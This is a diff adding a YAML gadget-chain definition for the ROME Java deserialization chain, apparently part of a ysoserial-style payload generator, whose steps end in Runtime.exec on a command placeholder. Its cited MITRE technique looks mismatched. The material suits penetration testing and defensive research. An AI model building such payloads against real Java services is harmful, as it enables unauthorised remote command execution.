@@ -1,0 +1,24 @@
+name: "ROME"
+category: "rome"
+description: "ROME gadget chain using ToStringBean and EqualsBean"
+jdk_version: "all"
+dependencies:
+  - name: "rome"
+    version: "1.0"
+exploit_type: "command_execution"
+payload_type: "command"
+risk_level: 5
+mitre_technique: "T1566.001"
+references:
+  - "https://github.com/frohoff/ysoserial"
+steps:
+  - class_name: "com.sun.syndication.feed.impl.ToStringBean"
+    method_name: "toString"
+    parameters: []
+  - class_name: "com.sun.syndication.feed.impl.EqualsBean"
+    method_name: "beanHashCode"
+    parameters: []
+  - class_name: "java.lang.Runtime"
+    method_name: "exec"
+    parameters:
+      - "{command}"
